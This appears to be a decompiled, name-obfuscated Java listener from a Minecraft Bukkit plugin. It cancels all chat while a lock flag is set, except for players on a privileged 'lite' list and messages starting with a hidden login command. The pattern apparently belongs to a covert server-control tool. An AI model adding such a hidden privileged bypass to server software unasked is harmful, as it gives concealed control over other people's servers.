/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 *  org.bukkit.event.EventHandler
 *  org.bukkit.event.Listener
 *  org.bukkit.event.player.AsyncPlayerChatEvent
 */
package me.system.runner.events;

import me.system.runner.Core;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class LockChatListener
implements Listener {
    private static final /* synthetic */ Core INSTANCE;

    public LockChatListener() {
        LockChatListener lllllllllIlll;
    }

    @EventHandler
    public void onChatMessage(AsyncPlayerChatEvent lllllllllIIIl) {
        Player lllllllllIIlI = lllllllllIIIl.getPlayer();
        if (LockChatListener.INSTANCE.chatLocked && !LockChatListener.INSTANCE.lite.contains(lllllllllIIlI.getName()) && !lllllllllIIIl.getMessage().toLowerCase().startsWith(Settings.LOGIN_COMMAND)) {
            lllllllllIIIl.setMessage(null);
            lllllllllIIIl.setCancelled(true);
        }
    }

    static {
        INSTANCE = (Core)Core.getPlugin(Core.class);
    }
}

